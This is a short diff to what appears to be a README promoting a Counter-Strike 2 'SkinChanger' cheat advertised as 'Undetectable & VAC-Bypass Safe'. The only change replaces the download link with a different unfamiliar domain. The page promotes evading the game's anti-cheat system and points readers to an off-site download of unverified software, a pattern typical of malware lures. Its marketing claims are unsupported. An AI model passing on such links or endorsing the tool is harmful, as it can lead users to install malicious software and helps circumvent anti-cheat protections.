@@ -7,7 +7,7 @@ Unlock every skin in **Counter-Strike 2** instantly with this powerful and undet
 - 🚫 **Undetectable & VAC-Bypass Safe**  
 - 🖥️ **Sleek UI with Skin Previews**
 
-[![Download CS2 SkinChanger](https://img.shields.io/badge/Download-CS2%20SkinChanger-blueviolet)](https://resser.tech)
+[![Download CS2 SkinChanger](https://img.shields.io/badge/Download-CS2%20SkinChanger-blueviolet)](https://2xethevent.com)
 
 Look like a pro, play like a king. No loot boxes, no limits. 👑
 
